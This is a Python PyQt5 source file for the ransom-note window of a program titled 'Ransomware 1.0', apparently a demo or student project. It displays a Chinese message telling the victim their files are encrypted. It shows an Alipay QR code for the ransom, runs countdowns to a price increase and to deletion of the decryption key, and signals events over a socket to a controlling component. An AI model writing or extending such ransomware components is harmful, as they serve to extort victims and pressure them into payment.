# !/usr/bin/env python3
# -*- coding:utf-8 -*-
import sys
from PyQt5.QtWidgets import QApplication, QMainWindow,QMessageBox
from PyQt5 import QtCore, QtWidgets,QtGui
from PyQt5.QtCore import QTimer,QDateTime
from alipay_trade.trade import tradeManager
from PyQt5.QtGui import QIcon
from threading import Thread
import time

app_private_key_string = open("./alipay_trade/keys/app_private_key.pem").read()
ali_public_key_string = open("./alipay_trade/keys/ali_public_key.pem").read()
app_id_string = "2016102300746854"

class Ui_MainWindow(QMainWindow,tradeManager):
    def __init__(self):
        super(Ui_MainWindow, self).__init__()
        self.gen_trade(1.)

        self.hour1 = 0
        self.min1 = 0
        self.sec1 = 30
        self.hour2 = 0
        self.min2 = 0
        self.sec2 = 60

        self.setupUi(self)
        self.time = QTimer(self)
        self.time.setInterval(1000)
        self.time.timeout.connect(self.Refresh)
        self.time.start()

    def setupUi(self, MainWindow):
        MainWindow.resize(900, 600)
        self.setWindowIcon(QIcon('./icon.png'))
        self.setWindowTitle("勒索软件1.0")
        self.setObjectName("MainWindow")
        self.setStyleSheet("#MainWindow{background-color: rgb(128, 10, 10)}")

        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")

        self.textBrowser = QtWidgets.QTextBrowser(self.centralwidget)
        self.textBrowser.setGeometry(QtCore.QRect(250, 100, 600, 200))
        self.textBrowser.setObjectName("textBrowser")

        font1 = QtGui.QFont()
        font1.setFamily("Arial")  # 括号里可以设置成自己想要的其它字体
        font1.setPointSize(15)  # 括号里的数字可以设置成自己想要的字体大小
        self.textBrowser.setFont(font1)
        self.textBrowser.setText("您好！您的电脑已经中了勒索病毒，您的所有文件都已被加密，请扫描以下二维码支付赎金以便得到解密密钥,赎金的价格为￥1，我们将在12小时之内提高价格到￥2，并于24小时内删除解密密钥。扫码后我们将自动利用获取的解密密钥为您解密。")

        self.label_warn = QtWidgets.QLabel(self.centralwidget)
        self.label_warn.setText("哇哦~你的文件被加密了！")
        self.label_warn.setGeometry(QtCore.QRect(250, 30, 500, 40))
        font = QtGui.QFont()
        font.setFamily("Arial")  # 括号里可以设置成自己想要的其它字体
        font.setPointSize(20)  # 括号里的数字可以设置成自己想要的字体大小
        self.label_warn.setFont(font)
        self.label_warn.setStyleSheet("color:white")

        pix = QtGui.QPixmap(self.save_path)
        #print(self.save_path)
        self.label_qr = QtWidgets.QLabel(self.centralwidget)
        self.label_qr.setGeometry(410, 320, 250, 250)
        self.label_qr.setPixmap(pix)
        self.label_qr.setScaledContents(True)

        pix = QtGui.QPixmap('./lock.png')
        self.label_qr = QtWidgets.QLabel(self.centralwidget)
        self.label_qr.setGeometry(30, 40, 180, 180)
        self.label_qr.setPixmap(pix)
        self.label_qr.setScaledContents(True)

        self.label_time1 = QtWidgets.QLabel(self.centralwidget)
        self.label_time1.setGeometry(QtCore.QRect(30, 300, 200, 100))
        self.label_time1.setFont(font)
        self.label_time1.setStyleSheet("color:white")
        self.label_time1.setText("距离提价时间：\n   12:00:00")

        self.label_time2 = QtWidgets.QLabel(self.centralwidget)
        self.label_time2.setText("距离撕票时间：\n   24:00:00")
        self.label_time2.setGeometry(QtCore.QRect(30, 420, 200, 100))
        self.label_time2.setFont(font)
        self.label_time2.setStyleSheet("color:white")


        MainWindow.setCentralWidget(self.centralwidget)
        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        # self.pushButton2.setText(_translate("MainWindow", "解密"))

    def Refresh(self):
        if self.hour1==0 and self.min1==0 and self.sec1==0:
            QMessageBox.information(self,  # 使用infomation信息框
                                    "提示",
                                    "你未在规定时间内支付赎金，所以我们提高了赎金。")
            self.hour1=-1
            self.label_time1.setText("距离提价时间：\n   00:00:00")

            self.sk.sendall(bytes("3", "utf-8"))
            print("赎金翻倍")#开始切换二维码

            self.flag_watch_and_cancel1 = 0
            time.sleep(2)
            self.flag_watch_and_cancel1 = 1

            self.gen_trade(2.)
            Thread(target=self._watch_and_cancel).start()
            self.setupUi(self)

        if self.hour1>=0 and self.min1>=0 and self.sec1>=0:
            if self.sec1!=0:
                self.sec1 -= 1
            elif self.sec1==0 and self.min1!=0:
                self.sec1=59
                self.min1-=1
            elif self.sec1==0 and self.min1==0 and self.hour1!=0:
                self.hour1-=1
                self.min1=59
                self.sec1=59

        if self.hour2 == 0 and self.min2 == 0 and self.sec2 == 0:
            QMessageBox.information(self,  # 使用infomation信息框
                                    "提示",
                                    "你未在规定时间内支付赎金，你的文件和你永别了。")

            self.time.stop()
            self.sk.sendall(bytes("4", "utf-8"))

        if self.hour2 >= 0 and self.min2 >= 0 and self.sec2 >= 0:
            if self.sec2 != 0:
                self.sec2 -= 1
            elif self.sec2 == 0 and self.min2 != 0:
                self.sec2 = 59
                self.min2 -= 1
            elif self.sec2 == 0 and self.min2 == 0 and self.hour2 != 0:
                self.hour2 -= 1
                self.min2 = 59
                self.sec2 = 59

            hour1=str(self.hour1).rjust(2, '0')
            min1 = str(self.min1).rjust(2, '0')
            sec1 = str(self.sec1).rjust(2, '0')
            hour2 = str(self.hour2).rjust(2, '0')
            min2 = str(self.min2).rjust(2, '0')
            sec2 = str(self.sec2).rjust(2, '0')

            self.label_time1.setText("距离提价时间：\n   {}:{}:{}".format(hour1,min1,sec1))
            self.label_time2.setText("距离撕票时间：\n   {}:{}:{}".format(hour2,min2,sec2))

        if self.hour1==-1:
            self.label_time1.setText("距离提价时间：\n   00:00:00")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = Ui_MainWindow()
    win.show()
    sys.exit(app.exec_())